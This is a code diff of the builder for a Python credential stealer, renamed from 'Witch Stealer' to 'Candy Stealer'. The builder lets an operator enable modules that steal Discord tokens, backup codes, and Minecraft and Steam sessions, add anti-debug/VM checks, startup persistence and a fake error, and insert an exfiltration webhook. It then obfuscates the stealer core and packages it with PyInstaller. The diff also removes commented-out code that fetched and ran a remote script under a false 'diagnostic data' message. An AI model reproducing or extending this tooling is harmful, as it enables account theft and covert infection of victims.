@@ -19,30 +19,54 @@ from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, Sp
 from rich import print as rprint
 from datetime import *
 from plyer import notification
-from utils.module.Obfuscators import Obfuscators # Restored because obfscator was not the problem
+# ======================================================================= #
+from utils.module.Obfuscators import Obfuscators 
 from utils.module.logger import log_debug, timestamp, log_warn, log_error
 
 os.system("cls")
-obf = Obfuscators(include_imports=True, recursion=3)
+obf = Obfuscators(include_imports=True, recursion=2)
 
-version = "v1.56.1-py"
-CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]
+# =========================================================================================================================================================== #
+version = "1.56.3"                                                                                                                                        #
+# =========================================================================================================================================================== #
+CONFIG_KEYS = ["Anti_Debugs_VM", "discord", "backupcode", "system", "minecraft", "Steam", "startup", "ERROR"]                                                 #
+# =========================================================================================================================================================== #
 ENABLE_KEYS = ["Anti Debug / VM","Discord Steal", "BACKUPCODE STEAL", "System INFO", "Minecraft Session Steal", "Steam Session Steal", "Startup", "FAKE ERROR"]
-PATH = "src/stealer_core/src.py"
+# =========================================================================================================================================================== #
+PATH = "src/stealer_core/src.py"                                                                                                                              #
+# =========================================================================================================================================================== #
+Cloud_Version = "https://raw.githubusercontent.com/nojumpdelay/Candy-stealer/refs/heads/main/builder/raw/f556WI8VKR1eciLRFaLVhU8nC"                                    #
+# =========================================================================================================================================================== #
+VersionHash = requests.get(Cloud_Version)
+
+hash_version = VersionHash.text.strip()
+
 
 print(Fore.LIGHTMAGENTA_EX + Center.XCenter("""
- __          ___ _       _     
- \ \        / (_) |     | |    
-  \ \  /\  / / _| |_ ___| |__  
-   \ \/  \/ / | | __/ __| '_ \ 
-    \  /\  /  | | || (__| | | |
-     \/  \/   |_|\__\___|_| |_|
+ ██████╗ █████╗ ███╗   ██╗██████╗ ██╗   ██╗
+██╔════╝██╔══██╗████╗  ██║██╔══██╗╚██╗ ██╔╝
+██║     ███████║██╔██╗ ██║██║  ██║ ╚████╔╝ 
+██║     ██╔══██║██║╚██╗██║██║  ██║  ╚██╔╝  
+╚██████╗██║  ██║██║ ╚████║██████╔╝   ██║   
+ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝    ╚═╝   
 """))
 print (" ")
 username = getpass.getuser()
-log_debug(f"Witch Version | {version}")
-# print (timestamp() + f"{Fore.GREEN}DEBUG")
 
+if version == hash_version:
+    log_debug(f"Candy-stealer | Local Version: {version} | Cloud Version: {hash_version}")
+else:
+    log_warn(f"Outdated! | Local Version: {version} | Cloud Version: {hash_version}")
+
+def Version_Checker():
+    if version.endswith("-dev"):
+        log_warn("You are using the Dev version!")
+
+    if version.endswith("-test"):
+      log_warn("You are using the test version!")
+
+    if version.endswith("-py"):
+      log_warn("You are using the Python Version Changed version!")
 
 def ask_toggle(key):
     print(timestamp() + f"{Fore.LIGHTMAGENTA_EX}* {Fore.RESET}Enable {key}?:{Fore.CYAN} ", end="", flush=True)
@@ -75,39 +99,32 @@ def update_config_in_file(filepath, updated_config, webhook_url=None):
         with open(filepath, "r", encoding="utf-8") as f:
             content = f.read()
     except Exception as e:
-        log_error(f"Reading file {filepath}: {e}")
+        log_error(f"[File Read Error] {filepath}: {e}")
+        return  
 
     try:
         for key, value in updated_config.items():
             content = re.sub(rf'"{key}":\s*(True|False)', f'"{key}": {value}', content)
+
         if webhook_url:
             content = re.sub(r'"webhook":\s*"[^"]*"', f'"webhook": \"{webhook_url}\"', content)
+
         with open(filepath, "w", encoding="utf-8") as f:
             f.write(content)
-        log_debug(f"GET")
-        log_debug(f"Config: \n Hook: {webhook_url}| {key}: value: {value}")
-    except Exception as e:
-        log_error(f"Error updating config in {filepath}: {e}")
-        sys.exit(1)
-     
-# def Data():
-#     GITHUB_RAW = "https://raw.githubusercontent.com/nojumpdelay/Privacy-data/refs/heads/main/data.py"
-#     try:
-#         response = requests.get(GITHUB_RAW)
-#
-#        if response.status_code == 200:
-#            with tempfile.NamedTemporaryFile(suffix=".py", delete=True) as temp_file:
-#                temp_file.write(response.content)
-#                temp_path = temp_file.name
 
-#            subprocess.run(["python", temp_path], check=True)
-#
-#            os.remove(temp_path)
-#        else:
-#            log_debug("Your diagnostic data has been sent! Thank you for your cooperation.")
-#            log_warn("This diagnostic data does not include your information. It is just used to check if my project is being used :D")
-#    except Exception as e:
-#        print(f"{e}")
+        log_debug("GET")
+        log_debug(f"Config {Fore.WHITE}204{Fore.RESET}")
+        log_debug(f" WebHook: {webhook_url}")
+        for key, value in updated_config.items():
+            log_debug(f"  {key}: {value}")
+
+        if version.endswith("-dev"):
+            log_debug("\n[DEV MODE] Full content preview:")
+            log_debug(f"{content}")
+
+    except Exception as e:
+        log_error(f"[Update Error] Config update failed for {filepath}: {e}")
+        sys.exit(1)
 
 def build():
     url = "https://pypi.org/pypi/pyinstaller/json"
@@ -133,12 +150,12 @@ def build():
     notification.notify(
     title='Build Completed.',
     message='The build is complete, please check the dist.',
-    app_name=f'Witch Stealer Builder v{version}',
+    app_name=f'Candy Stealer Builder v{version}',
     timeout=5  
 )
 
-
 def main():
+    Version_Checker()
     config = {}
     webhook = ask_webhook()
     for key, label in zip(CONFIG_KEYS, ENABLE_KEYS):
